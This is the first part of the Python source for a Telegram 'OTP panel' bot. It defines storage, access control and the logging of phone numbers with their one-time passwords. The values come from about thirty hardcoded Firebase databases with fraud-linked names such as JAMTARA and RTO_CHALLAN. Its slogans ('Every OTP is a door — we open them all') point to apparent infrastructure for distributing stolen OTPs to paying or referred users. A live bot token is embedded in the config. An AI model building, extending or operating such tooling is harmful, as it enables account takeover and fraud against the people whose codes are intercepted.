#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║        SHOWN X PANEL BOT — v18.0-U1 ULTRA SUPREME EDITION       ║
║  OTP Panel · ShownStore DNA · Live Monitor · User Hub            ║
║  Ban System · Analytics · Smart OTP · Multi-Admin · Backup+      ║
╚══════════════════════════════════════════════════════════════════╝
PART 1 — Core Engine · Storage · UI System
"""
from __future__ import annotations
import asyncio, gzip, html, io, json, logging, os, re, random
import time, traceback, hashlib, inspect as _inspect
from contextlib import asynccontextmanager
from datetime import datetime, timedelta
from pathlib import Path
import aiohttp, sqlite3

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton,
    InputMediaPhoto, InputMediaVideo,
)
try:
    from telegram import CopyTextButton as _COPY_BTN
except ImportError:
    _COPY_BTN = None

from telegram.constants import ParseMode
from telegram.error import (
    BadRequest, Forbidden, RetryAfter, TelegramError,
    Conflict, ChatMigrated,
)
from telegram.ext import (
    Application, ApplicationBuilder, CallbackQueryHandler,
    CommandHandler, ContextTypes, MessageHandler, filters,
)

# ══════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════
BOT_TOKEN        = os.environ.get("BOT_TOKEN", "8783298629:AAHFXP9fReu56h_IIe_Z1WhZQzObin2wmzQ")
BOT_USERNAME     = os.environ.get("BOT_USERNAME", "@shownallsrctestingbot")
BOT_BRAND_NAME   = os.environ.get("BOT_BRAND_NAME", "Shown")
OWNER_DISPLAY    = os.environ.get("OWNER_DISPLAY_NAME", "Shown")
OWNER_CONTACT    = os.environ.get("OWNER_CONTACT", "@shownofficial")
OWNER_ID         = int(os.environ.get("OWNER_ID", "8811450472"))
SQLITE_DB_PATH   = "shownxpanel_v18.db"
BOT_VERSION      = "v18.0-U1"
HEALTH_CHECK_PORT = 10000
POLL_INTERVAL    = 15
MAX_SEEN_IDS     = 300_000
FB_HEALTH_INTERVAL = 300
OTP_RATE_LIMIT   = 30     # max OTPs per minute per DB before throttle
OTP_STALE_MINS   = 10     # OTPs older than this = stale

PANEL_QUOTES = [
    "⚡ Speed is the soul of the hustle.",
    "🔥 Every OTP is a door — we open them all.",
    "🧬 Data flows where the rat goes.",
    "💎 Quality panel, premium results.",
    "🚀 Built in the walls, shipped before dawn.",
    "🎯 Precision first. Volume second.",
    "⚓ Grounded. Sharp. Always online.",
    "🌪 The storm doesn't stop the signal.",
    "🏆 Top tier panel, top tier results.",
    "⚔️ Sharper than the rest. Always.",
]

DEFAULT_DATABASES: dict[str, str] = {
    "👑 BOSS_R1":        "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
    "👑 BOSS_R2":        "https://runjun-master-panel-default-rtdb.firebaseio.com",
    "⚡ ALPHA_A2":       "https://rto9-d2b33-default-rtdb.firebaseio.com",
    "🔥 ALPHA_A5":       "https://challan-758d1-default-rtdb.asia-southeast1.firebasedatabase.app",
    "⚔️ ALPHA_A12":      "https://fir-1fa16-default-rtdb.firebaseio.com",
    "🎯 ALPHA_A19":      "https://u40179853-987df-default-rtdb.firebaseio.com",
    "🔫 ALPHA_A21":      "https://u62803313-e54bc-default-rtdb.firebaseio.com",
    "🦾 ALPHA_A24":      "https://u67583339-bf0c1-default-rtdb.firebaseio.com",
    "🏹 ALPHA_A27":      "https://u8208372-ad1d1-default-rtdb.firebaseio.com",
    "🌪 ALPHA_A29":      "https://u25428732-91bd9-default-rtdb.firebaseio.com",
    "💥 ALPHA_A31":      "https://u72749819-fa563-default-rtdb.firebaseio.com",
    "🩸 ALPHA_A32":      "https://u24143844-c1b11-default-rtdb.firebaseio.com",
    "👹 ALPHA_A33":      "https://u72328193-47b68-default-rtdb.firebaseio.com",
    "🎭 ALPHA_A34":      "https://u58325342-dffc0-default-rtdb.firebaseio.com",
    "⛓ ALPHA_A35":      "https://u75887828-b5a63-default-rtdb.firebaseio.com",
    "🧿 ALPHA_A36":      "https://u24153206-5eef6-default-rtdb.firebaseio.com",
    "💵 MAFIA_M7":       "https://rto-47-b39f4-default-rtdb.firebaseio.com",
    "💰 MAFIA_M15_1":    "https://chfjfj-c2857-default-rtdb.firebaseio.com",
    "💎 MAFIA_M15_2":    "https://ai-rto-9-default-rtdb.firebaseio.com",
    "✨ VIP_EXTRA":      "https://s85138920-87594-default-rtdb.firebaseio.com",
    "📦 FORTY_DATA":     "https://fortydata-fee65-default-rtdb.firebaseio.com",
    "📡 FPRO_INDUS":     "https://fpro3indus-default-rtdb.firebaseio.com",
    "🚨 JAMTARA_181":    "https://jamtara181-default-rtdb.firebaseio.com",
    "🛸 PMS_JDJ":        "https://pmsjdj-default-rtdb.firebaseio.com",
    "💻 MY_CARRY":       "https://cs6mycarry68jh-default-rtdb.firebaseio.com",
    "🃏 RANDI_RONA":     "https://randi-rona-81876-default-rtdb.firebaseio.com",
    "🚔 RTO_CHALLAN_A":  "https://rtochallan-8579d-default-rtdb.firebaseio.com",
    "🛑 RTO_CHALLAN_B":  "https://rtochallan8-default-rtdb.firebaseio.com",
    "🐾 JAMTARA_140":    "https://jamtara140-73bf7-default-rtdb.firebaseio.com",
    "🔮 GGGGGG_NODE":    "https://gggggg-979bd-default-rtdb.firebaseio.com",
    "⚡ SHOWN_SPECIAL":  "https://flash-v8enginepower-default-rtdb.firebaseio.com",
}

# ══════════════════════════════════════════════════════════════════
#  LOGGING
# ══════════════════════════════════════════════════════════════════
logging.basicConfig(
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
    level=logging.INFO,
)
for _noisy in ("httpx","aiohttp","telegram.ext","apscheduler"):
    logging.getLogger(_noisy).setLevel(logging.WARNING)
log = logging.getLogger("SHOWNX_V18")

# ══════════════════════════════════════════════════════════════════
#  PREMIUM EMOJI ENGINE
# ══════════════════════════════════════════════════════════════════
_PE1_IDS = [
    "5967280668885913944","5258476306152038031","5213395028038132311","5260342697075416641",
    "5258236805890710909","5260450573768990626","5429571366384842791","5956561916573782596",
    "5870930636742595124","5956561916573782596","5258514780469075716","5359719332542718652",
    "5463274047771000031","5282964865349081926","5418010521309815154","5372917041193828849",
    "5870930636742595124","5260379144167890225","6280818246476111911","6111547907393987376",
    "5199552030615558774","6235403472741603087","5384544226333711035","6098159343281121498",
    "6319074379175043387","5445355530111437729","5258514780469075716","6100129320225741245",
    "6100384016081361171","6098236364929635183","5453957997418004470","5462921117423384478",
    "6280578093379754919","5416081784641168838","6100388225149310843","5244837092042750681",
    "5258477770735885832","5375464961822695044","5359529383319084413","5257974976094412956",
    "6201822626692734126","5897850551156084824","6005986106703613755","6203998186541948045",
    "6278463693864838049","5416081784641168838","5213395028038132311","6100258190719457801",
    "6100670735213139506","6098125829651307984","6219792052599660507","5409008750893734809",
    "6269400956387987689","5447203607294265305","5453902265922376865","5377599075237502153",
    "5915833712368424979","5415722218569089767","5197480146981906157","5388846172951558229",
    "5305336095863485125","5388941018714356665","6319074379175043387","5305603955793867793",
    "5280816565657300091",
]
_PE1_EMOJIS = [
    "\u2709\ufe0f","\U0001f512","\u2705","\u274c","\u2b05\ufe0f","\u27a1\ufe0f","\U0001f50e",
    "\U0001f4c4","\U0001f4ca","\U0001f4c4","\U0001f4c2","\U0001f48e","\U0001f635","\U0001f49d",
    "\U0001f3ab","\U0001f680","\U0001f4ca","\U0001f53c","\U0001f4ac","\U0001f451",
    "\U0001fa99","\u2b50","\U0001f381","\U0001f4b0","\U0001f48e","\U0001f4e4","\U0001f4c2",
    "\U0001f6e1","\U0001f381","\U0001f4e2","\U0001f465","\U0001f6e0","\u2699\ufe0f",
    "\U0001f7e2","\U0001f6ab","\U0001f4c8","\U0001f4c4","\U0001f3ac","\u2795","\U0001f5bc",
    "\U0001f399","\U0001f4d6","\U0001f4f7","\U0001f451","\u2b50\ufe0f","\U0001f7e2","\u2705",
    "\U0001f534","\U0001f7e2","\U0001f389","\U0001f525","\U0001f3c6","\U0001f947","\U0001f948",
    "\U0001f949","\U0001f39f","\U0001f3b0","\U0001f352","\U0001f34b\u200d\U0001f7e9",
    "\U0001f347","\U0001f349","\U0001f34a","\U0001f48e","7\ufe0f\u20e3","\U0001f3b2",
]
_PE2_IDS = [
    "5418010521309815154","5258500400918587241","5451732530048802485","6332591195306334733",
    "6280368657889501500","5888781182249738113","6280648681167266267","6111396350883010682",
    "5258205968025525531","5444856076954520455","5258134813302332906","5350460637182993292",
    "5803057229909202251","6280712659000107348","5258331647358540449","5870930744116776638",
    "6221832909389570589","6098271033905650109","5447203607294265305","5453902265922376865",
    "6222239449518971912","5458603043203327669","6203974332293586380","5260502250815513613",
    "6172537761552142514","5280774071250872500","5384490809825450636","6278178593935728769",
    "6098271033905650109","6323166881712709901","6203957491726818885","5846210329700217522",
    "5258476306152038031","5258476306152038031","6334528491844798409","5462990652943904884",
    "6280289450102628695","5197434882321567830","5469641199348363998","5445353829304387411",
    "5444856076954520455","6280368657889501500","6203998186541948045","5188187560035234546",
    "6100670735213139506",
]
_PE2_EMOJIS = [
    "\U0001f3ab","\u270d\ufe0f","\u23f3","\U0001f51c","\U0001f464","\U0001f194","\U0001f4c5",
    "\u26d3","\U0001f4f8","\U0001f9fe","\U0001f4e6","\U0001f3af","\u267b\ufe0f","\U0001f5d1",
    "\u270d\ufe0f","\U0001f4cc","\U0001f31f","\U0001f947","\U0001f948","\U0001f949",
    "\u26a1\ufe0f","\U0001f514","\U0001f38a","\U0001f973","\U0001f340","\U0001f37e","\U0001f381",
    "\U0001f6e1","\U0001f947","\U0001f948","\u2705","\u274c","\u26a0\ufe0f","\U0001f512",
    "\U0001f513","\U0001f477","\U0001f634","\U0001f4b0","\U0001f4b5","\u2b50\ufe0f",
    "\U0001f4b3","\U0001f9fe","\U0001f464","\U0001f451","\u26d4\ufe0f",
]

PREMIUM_EMOJI_MAP: dict[str, str] = {}
for _e, _i in list(zip(_PE1_EMOJIS, _PE1_IDS)) + list(zip(_PE2_EMOJIS, _PE2_IDS)):
    PREMIUM_EMOJI_MAP.setdefault(_e, _i)
    PREMIUM_EMOJI_MAP.setdefault(_e.replace("\ufe0f",""), _i)
    PREMIUM_EMOJI_MAP.setdefault(_e + "\ufe0f", _i)

_EXTRA_EMOJI = {
    "\U0001f4b8":"5404561694510833322", "\U0001f50d":"6206446249181189526",
    "\U0001f4af":"5206318837489743801", "\u2604":"5224607267797606837",
    "\u26d4":"5246772116543512028",    "\u270b":"5339286072876614251",
    "\U0001f6f8":"5372849966689566579", "\u270f":"6204162490515855272",
    "\U0001f517":"6206497372176913599", "\u2b50":"6206404510689007446",
    "\u26a0":"6206174450765796040",    "\u2714":"6206479140040743133",
    "\U0001f6e1":"5282964865349081926", "\U0001f4f1":"5258476306152038031",
}
for _k,_v in _EXTRA_EMOJI.items():
    PREMIUM_EMOJI_MAP.setdefault(_k, _v)
    PREMIUM_EMOJI_MAP.setdefault(_k.replace("\ufe0f",""), _v)

_EMOJI_RE = re.compile(
    "|".join(re.escape(k) for k in sorted(PREMIUM_EMOJI_MAP, key=len, reverse=True))
)

def premiumize_html(text: str) -> str:
    if not text: return text
    parts = re.split(r"(<tg-emoji[^>]*>.*?</tg-emoji>|<[^>]+>)", text)
    out, in_code = [], 0
    for p in parts:
        if not p: continue
        if p.startswith("<tg-emoji") or p.startswith("<"):
            tag = p.lower()
            if tag.startswith(("<code","<pre")): in_code += 1
            elif tag.startswith(("</code","</pre")): in_code = max(0, in_code-1)
            out.append(p)
        elif in_code:
            out.append(p)
        else:
            out.append(_EMOJI_RE.sub(
                lambda m: f'<tg-emoji emoji-id="{PREMIUM_EMOJI_MAP[m.group(0)]}">{m.group(0)}</tg-emoji>',
                p
            ))
    return "".join(out)

# ══════════════════════════════════════════════════════════════════
#  TEXT STYLE ENGINE
# ══════════════════════════════════════════════════════════════════
_SC = dict(zip("abcdefghijklmnopqrstuvwxyz",
    ["\u1d00","\u0299","\u1d04","\u1d05","\u1d07","\ua730","\u0262","\u029c","\u026a",
     "\u1d0a","\u1d0b","\u029f","\u1d0d","\u0274","\u1d0f","\u1d29","q","\u0280",
     "\ua731","\u1d1b","\u1d1c","\u1d20","\u1d21","x","\u028f","\u1d22"]))
_SKIP_RE = re.compile(r"(<[^>]+>|&[a-zA-Z#0-9]+;|https?://\S+|@[A-Za-z0-9_]+|/[a-z_]+)")
_WORD_RE = re.compile(r"[A-Za-z]+")

def _style_word(m: re.Match) -> str:
    w, out, first = m.group(0), [], True
    for ch in w:
        if first and ch.isalpha(): out.append(ch.upper()); first = False
        else: out.append(_SC.get(ch, ch))
    return "".join(out)

def stylize_text(text: str) -> str:
    if not text: return text
    parts = _SKIP_RE.split(text)
    out, in_code = [], False
    for part in parts:
        if not part: continue
        if part.startswith("<"):
            tag = part.lower()
            if tag.startswith(("<code","<pre")): in_code = True
            elif tag.startswith(("</code","</pre")): in_code = False
            out.append(part)
        elif _SKIP_RE.fullmatch(part) or in_code:
            out.append(part)
        else:
            out.append(_WORD_RE.sub(_style_word, part))
    return "".join(out)

def beautify(text: str, parse_mode=None):
    if not text: return text, parse_mode
    if parse_mode is None:
        text = html.escape(text); parse_mode = ParseMode.HTML
    styled = premiumize_html(stylize_text(text))
    if not styled.lstrip().startswith("<blockquote"):
        styled = f"<blockquote>{styled}</blockquote>"
    return styled, parse_mode

# ══════════════════════════════════════════════════════════════════
#  PTB STYLE SAFETY WRAPPER
# ══════════════════════════════════════════════════════════════════
_IKB_SUPPORTS_STYLE = "style" in _inspect.signature(InlineKeyboardButton.__init__).parameters
_KB_SUPPORTS_STYLE  = "style" in _inspect.signature(KeyboardButton.__init__).parameters

def _ikb(text: str, *, style: str = "primary", **kwargs) -> InlineKeyboardButton:
    if _IKB_SUPPORTS_STYLE: return InlineKeyboardButton(text, style=style, **kwargs)
    return InlineKeyboardButton(text, **kwargs)

def _kb(text: str, *, style: str = "primary", **kwargs) -> KeyboardButton:
    if _KB_SUPPORTS_STYLE: return KeyboardButton(text, style=style, **kwargs)
    return KeyboardButton(text, **kwargs)

# ══════════════════════════════════════════════════════════════════
#  RICH MESSAGE SYSTEM
# ══════════════════════════════════════════════════════════════════
RICH_MESSAGES_ENABLED = True

async def send_rich_or_fallback(
    bot, chat_id, fallback_html: str,
    media_file_id: str = "", media_type: str = "",
    reply_markup=None,
) -> None:
    mt = (media_type or "").strip().lower()
    if media_file_id:
        try:
            if mt == "photo":
                await bot.send_photo(chat_id, media_file_id, caption=fallback_html,
                    parse_mode=ParseMode.HTML, reply_markup=reply_markup)
            elif mt == "video":
                await bot.send_video(chat_id, media_file_id, caption=fallback_html,
                    parse_mode=ParseMode.HTML, reply_markup=reply_markup)
            elif mt in ("animation","gif"):
                await bot.send_animation(chat_id, media_file_id, caption=fallback_html,
                    parse_mode=ParseMode.HTML, reply_markup=reply_markup)
            else:
                await bot.send_message(chat_id, fallback_html,
                    parse_mode=ParseMode.HTML, reply_markup=reply_markup)
            return
        except TelegramError:
            pass
    await bot.send_message(chat_id, fallback_html,
        parse_mode=ParseMode.HTML, reply_markup=reply_markup)

# ══════════════════════════════════════════════════════════════════
#  UI HELPERS
# ══════════════════════════════════════════════════════════════════
DIVIDER      = "━━━━━━━━━━━━━━━━━━━━━━━"
DIVIDER_THIN = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"

def ui_box(*lines: str) -> str:
    body = "\n".join(l for l in lines if l)
    return f"<blockquote>{body}</blockquote>" if body else ""

def ui_kv(icon: str, label: str, value: str) -> str:
    return f"{icon} <b>{label}:</b> {value}"

def ui_screen(icon: str, title: str, *blocks: str,
              subtitle: str = "", footer: str = "") -> str:
    header = (f"<blockquote>{DIVIDER}\n"
              f"{icon} <b>{title.upper()}</b>\n"
              f"{DIVIDER}</blockquote>")
    sub  = f"\n<i>{subtitle}</i>" if subtitle else ""
    body = "\n\n".join(b for b in blocks if b)
    foot = f"\n\n<blockquote><i>{footer}</i></blockquote>" if footer else ""
    return f"{header}{sub}\n\n{body}{foot}"

def ui_status(label: str, active: bool) -> str:
    return f"{'🟢' if active else '🔴'} <b>{label}:</b> {'On' if active else 'Off'}"

def back_row(cb: str = "home", label: str = "⬅️ Back") -> list:
    return [_ikb(label, callback_data=cb, style="primary")]

def kb_grid(buttons: list, cols: int = 2) -> list[list]:
    return [buttons[i:i+cols] for i in range(0, len(buttons), cols)]

def he(text: str) -> str:
    return html.escape(str(text))

def fmt_dt(iso: str | None) -> str:
    if not iso: return "—"
    try: return datetime.fromisoformat(iso).strftime("%d %b %Y, %H:%M")
    except: return str(iso)

def fmt_size(n: int) -> str:
    for u in ("B","KB","MB","GB"):
        if n < 1024: return f"{n:.1f} {u}" if u != "B" else f"{int(n)} B"
        n /= 1024
    return f"{n:.1f} TB"

def safe_cb(name: str) -> str:
    """Safe callback_data key from DB name."""
    return re.sub(r'[^a-zA-Z0-9_\-]', '_', name)[:40]

# ══════════════════════════════════════════════════════════════════
#  SQLITE LAYER
# ══════════════════════════════════════════════════════════════════
_db_conn: sqlite3.Connection | None = None
_db_lock = asyncio.Lock()

def _get_conn() -> sqlite3.Connection:
    global _db_conn
    if _db_conn is None:
        _db_conn = sqlite3.connect(SQLITE_DB_PATH, check_same_thread=False)
        _db_conn.row_factory = sqlite3.Row
        _db_conn.execute("PRAGMA journal_mode=WAL")
        _db_conn.execute("PRAGMA synchronous=NORMAL")
        _db_conn.execute("PRAGMA cache_size=-8000")
        _db_conn.execute("PRAGMA temp_store=MEMORY")
    return _db_conn

@asynccontextmanager
async def db():
    async with _db_lock:
        conn = _get_conn()
        try:
            yield conn
            conn.commit()
        except Exception:
            conn.rollback()
            raise

async def init_db() -> None:
    async with db() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY, value TEXT
        );
        CREATE TABLE IF NOT EXISTS admins (
            user_id INTEGER PRIMARY KEY,
            added_by INTEGER, added_at TEXT
        );
        CREATE TABLE IF NOT EXISTS allowed_users (
            user_id INTEGER PRIMARY KEY,
            granted_by INTEGER, granted_at TEXT,
            tier TEXT DEFAULT 'basic'
        );
        CREATE TABLE IF NOT EXISTS banned_users (
            user_id INTEGER PRIMARY KEY,
            banned_by INTEGER, banned_at TEXT,
            reason TEXT, until TEXT
        );
        CREATE TABLE IF NOT EXISTS all_users (
            user_id INTEGER PRIMARY KEY,
            username TEXT, first_name TEXT,
            join_date TEXT, last_seen TEXT,
            referrals TEXT DEFAULT '[]',
            tier TEXT DEFAULT 'free',
            notes TEXT DEFAULT '',
            otp_count INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS user_hub (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            phone TEXT NOT NULL,
            otp TEXT, db_name TEXT, db_url TEXT,
            timestamp TEXT NOT NULL,
            hash TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_hub_user ON user_hub(user_id);
        CREATE INDEX IF NOT EXISTS idx_hub_phone ON user_hub(phone);
        CREATE INDEX IF NOT EXISTS idx_hub_hash ON user_hub(hash);
        CREATE TABLE IF NOT EXISTS firebase_health (
            db_name TEXT PRIMARY KEY, db_url TEXT,
            status TEXT DEFAULT 'unknown',
            last_check TEXT, fail_count INTEGER DEFAULT 0,
            notes TEXT DEFAULT '', tag TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS backup_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL, filename TEXT NOT NULL,
            size_bytes INTEGER, target_chat INTEGER
        );
        CREATE TABLE IF NOT EXISTS monitor_subs (
            user_id INTEGER PRIMARY KEY, active INTEGER DEFAULT 1
        );
        CREATE TABLE IF NOT EXISTS welcome_config (
            id INTEGER PRIMARY KEY CHECK(id=1),
            text TEXT, media_file_id TEXT, media_type TEXT,
            text_b TEXT, media_file_id_b TEXT, media_type_b TEXT,
            updated_at TEXT
        );
        INSERT OR IGNORE INTO welcome_config(id) VALUES(1);
        CREATE TABLE IF NOT EXISTS cloned_panels (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL, source_name TEXT,
            db_url TEXT NOT NULL, created_at TEXT, notes TEXT
        );
        CREATE TABLE IF NOT EXISTS activity_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, action TEXT,
            detail TEXT, timestamp TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_act_user ON activity_log(user_id);
        CREATE TABLE IF NOT EXISTS otp_analytics (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            db_name TEXT, phone TEXT, otp TEXT,
            hour INTEGER, day TEXT, timestamp TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_ana_db ON otp_analytics(db_name);
        CREATE INDEX IF NOT EXISTS idx_ana_day ON otp_analytics(day);
        CREATE TABLE IF NOT EXISTS db_meta (
            db_name TEXT PRIMARY KEY,
            tag TEXT DEFAULT '',
            notes TEXT DEFAULT '',
            priority INTEGER DEFAULT 0,
            blacklisted_numbers TEXT DEFAULT '[]',
            custom_path TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS number_blacklist (
            phone TEXT PRIMARY KEY, added_at TEXT, reason TEXT
        );
        CREATE TABLE IF NOT EXISTS otp_format (
            id INTEGER PRIMARY KEY CHECK(id=1),
            template TEXT
        );
        INSERT OR IGNORE INTO otp_format(id,template)
        VALUES(1,'📡 <b>NEW OTP</b>\n📱 {phone}\n🔑 {otp}\n🗄 {db}\n🕐 {time}');
        """)
    log.info("DB initialized: %s", SQLITE_DB_PATH)

# ══════════════════════════════════════════════════════════════════
#  SETTINGS
# ══════════════════════════════════════════════════════════════════
_settings_cache: dict[str, str] = {}
_settings_lock = asyncio.Lock()

DEFAULT_SETTINGS = {
    "grant_access_required": "1",
    "referral_enabled":      "1",
    "required_referrals":    "2",
    "auto_db_enabled":       "0",
    "auto_db_interval":      "3600",
    "auto_db_group":         "",
    "poll_interval":         "15",
    "monitor_enabled":       "0",
    "maintenance_mode":      "0",
    "forward_channel":       "",
    "otp_rate_limit":        "30",
    "whitelist_mode":        "0",
    "bot_brand_name":        BOT_BRAND_NAME,
    "owner_contact":         OWNER_CONTACT,
    "otp_stale_mins":        "10",
    "multi_backup_targets":  "[]",
}

async def get_setting(key: str, default: str = "") -> str:
    async with _settings_lock:
        if key in _settings_cache:
            v = _settings_cache[key]
            return v if v not in (None,"") else default
    async with db() as c:
        row = c.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
        v = row["value"] if row else None
    async with _settings_lock:
        _settings_cache[key] = v or default
    return v if v not in (None,"") else default

async def set_setting(key: str, value: str) -> None:
    async with db() as c:
        c.execute("INSERT INTO settings(key,value) VALUES(?,?) "
                  "ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key,value))
    async with _settings_lock:
        _settings_cache[key] = value

async def gsbool(key: str, default: bool = False) -> bool:
    return await get_setting(key, "1" if default else "0") == "1"

async def gsint(key: str, default: int = 0) -> int:
    try: return int(await get_setting(key, str(default)))
    except: return default

async def gsjson(key: str, default=None):
    v = await get_setting(key, "")
    if not v: return default
    try: return json.loads(v)
    except: return default

async def _init_defaults() -> None:
    for k,v in DEFAULT_SETTINGS.items():
        async with db() as c:
            c.execute("INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)", (k,v))

# ══════════════════════════════════════════════════════════════════
#  GLOBAL STATE
# ══════════════════════════════════════════════════════════════════
DATABASES: dict[str, str]  = dict(DEFAULT_DATABASES)
seen_ids:  set[str]        = set()
seen_hashes: set[str]      = set()
first_run: bool            = True
_http_session: aiohttp.ClientSession | None = None
_main_app: Application | None = None
_fb_health: dict[str, dict] = {}
allowed_users: set[int]    = set()
banned_users: dict[int, dict] = {}
ADMIN_IDS: set[int]        = {OWNER_ID}
pending_action: dict[int, dict] = {}
_db_rate: dict[str, list]  = {}   # db_name -> [timestamps]
_monitor_subs: set[int]    = set()

# ══════════════════════════════════════════════════════════════════
#  ACCESS + BAN CONTROL
# ══════════════════════════════════════════════════════════════════
def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

def is_banned(uid: int) -> bool:
    if uid not in banned_users: return False
    info = banned_users[uid]
    if info.get("until"):
        try:
            if datetime.fromisoformat(info["until"]) < datetime.utcnow():
                banned_users.pop(uid, None)
                return False
        except: pass
    return True

async def has_access(uid: int) -> bool:
    if is_admin(uid): return True
    if is_banned(uid): return False
    if not await gsbool("grant_access_required", True): return True
    if uid in allowed_users: return True
    if await gsbool("referral_enabled", True):
        req = await gsint("required_referrals", 2)
        if await referral_count(uid) >= req: return True
    return False

async def referral_count(uid: int) -> int:
    async with db() as c:
        row = c.execute("SELECT referrals FROM all_users WHERE user_id=?", (uid,)).fetchone()
    if not row: return 0
    try: return len(set(str(x) for x in json.loads(row["referrals"] or "[]")))
    except: return 0

async def grant_access(uid: int, by: int = OWNER_ID, tier: str = "basic") -> None:
    allowed_users.add(uid)
    async with db() as c:
        c.execute("INSERT OR REPLACE INTO allowed_users(user_id,granted_by,granted_at,tier) "
                  "VALUES(?,?,?,?)", (uid, by, datetime.utcnow().isoformat(), tier))

async def revoke_access(uid: int) -> None:
    allowed_users.discard(uid)
    async with db() as c:
        c.execute("DELETE FROM allowed_users WHERE user_id=?", (uid,))

async def ban_user(uid: int, by: int, reason: str = "", hours: int = 0) -> None:
    until = None
    if hours > 0:
        until = (datetime.utcnow() + timedelta(hours=hours)).isoformat()
    banned_users[uid] = {"reason": reason, "until": until, "by": by}
    allowed_users.discard(uid)
    async with db() as c:
        c.execute("INSERT OR REPLACE INTO banned_users(user_id,banned_by,banned_at,reason,until) "
                  "VALUES(?,?,?,?,?)", (uid, by, datetime.utcnow().isoformat(), reason, until))

async def unban_user(uid: int) -> None:
    banned_users.pop(uid, None)
    async with db() as c:
        c.execute("DELETE FROM banned_users WHERE user_id=?", (uid,))

async def load_access_data() -> None:
    async with db() as c:
        rows = c.execute("SELECT user_id FROM allowed_users").fetchall()
        allowed_users.update(r["user_id"] for r in rows)
        arows = c.execute("SELECT user_id FROM admins").fetchall()
        ADMIN_IDS.update(r["user_id"] for r in arows)
        brows = c.execute("SELECT user_id,reason,until FROM banned_users").fetchall()
        for r in brows:
            banned_users[r["user_id"]] = {"reason": r["reason"], "until": r["until"]}

async def ensure_user(uid: int, username: str | None, first_name: str | None) -> bool:
    now = datetime.utcnow().isoformat()
    async with db() as c:
        exists = c.execute("SELECT 1 FROM all_users WHERE user_id=?", (uid,)).fetchone()
        if exists:
            c.execute("UPDATE all_users SET username=?,first_name=?,last_seen=? WHERE user_id=?",
                      (username, first_name, now, uid))
            return False
        c.execute("INSERT INTO all_users(user_id,username,first_name,join_date,last_seen) "
                  "VALUES(?,?,?,?,?)", (uid, username, first_name, now, now))
    return True

# ══════════════════════════════════════════════════════════════════
#  OTP DEDUP + RATE LIMIT
# ══════════════════════════════════════════════════════════════════
def otp_hash(phone: str, otp: str, db_name: str) -> str:
    return hashlib.md5(f"{phone}:{otp}:{db_name}".encode()).hexdigest()

def is_duplicate(phone: str, otp: str, db_name: str, uid: str) -> bool:
    if uid in seen_ids: return True
    h = otp_hash(phone, otp, db_name)
    if h in seen_hashes: return True
    if len(seen_ids) >= MAX_SEEN_IDS:
        seen_ids.clear(); seen_hashes.clear()
    seen_ids.add(uid)
    seen_hashes.add(h)
    return False

def check_rate_limit(db_name: str, limit: int) -> bool:
    """Returns True if within limit (not throttled)."""
    now = time.time()
    times = _db_rate.setdefault(db_name, [])
    _db_rate[db_name] = [t for t in times if now - t < 60]
    if len(_db_rate[db_name]) >= limit: return False
    _db_rate[db_name].append(now)
    return True

def is_stale(entry: dict, stale_mins: int) -> bool:
    for key in ("timestamp","time","created_at","date"):
        val = entry.get(key)
        if val:
            try:
                ts = float(val) if str(val).replace('.','').isdigit() else datetime.fromisoformat(str(val)).timestamp()
                return (time.time() - ts) > stale_mins * 60
            except: pass
    return False

# ══════════════════════════════════════════════════════════════════
#  USER HUB
# ══════════════════════════════════════════════════════════════════
async def log_number_used(uid: int, phone: str, otp: str,
                          db_name: str, db_url: str) -> None:
    h = otp_hash(phone, otp, db_name)
    async with db() as c:
        c.execute("INSERT INTO user_hub(user_id,phone,otp,db_name,db_url,timestamp,hash) "
                  "VALUES(?,?,?,?,?,?,?)",
                  (uid, phone, otp, db_name, db_url, datetime.utcnow().isoformat(), h))
        c.execute("UPDATE all_users SET otp_count=otp_count+1 WHERE user_id=?", (uid,))

async def get_user_hub(uid: int, page: int = 0, per: int = 8) -> tuple[list, int]:
    offset = page * per
    async with db() as c:
        total = c.execute("SELECT COUNT(*) FROM user_hub WHERE user_id=?", (uid,)).fetchone()[0]
        rows  = c.execute("SELECT phone,otp,db_name,timestamp FROM user_hub WHERE user_id=? "
                          "ORDER BY timestamp DESC LIMIT ? OFFSET ?", (uid, per, offset)).fetchall()
    return [dict(r) for r in rows], total

async def get_user_hub_stats(uid: int) -> dict:
    async with db() as c:
        total  = c.execute("SELECT COUNT(*) FROM user_hub WHERE user_id=?", (uid,)).fetchone()[0]
        unique = c.execute("SELECT COUNT(DISTINCT phone) FROM user_hub WHERE user_id=?", (uid,)).fetchone()[0]
        last   = c.execute("SELECT timestamp FROM user_hub WHERE user_id=? ORDER BY timestamp DESC LIMIT 1", (uid,)).fetchone()
    return {"total": total, "unique_phones": unique, "last_active": last[0] if last else None}

async def search_user_hub(uid: int, phone: str) -> list:
    async with db() as c:
        rows = c.execute("SELECT phone,otp,db_name,timestamp FROM user_hub "
                         "WHERE user_id=? AND phone LIKE ? ORDER BY timestamp DESC LIMIT 20",
                         (uid, f"%{phone}%")).fetchall()
    return [dict(r) for r in rows]

# ══════════════════════════════════════════════════════════════════
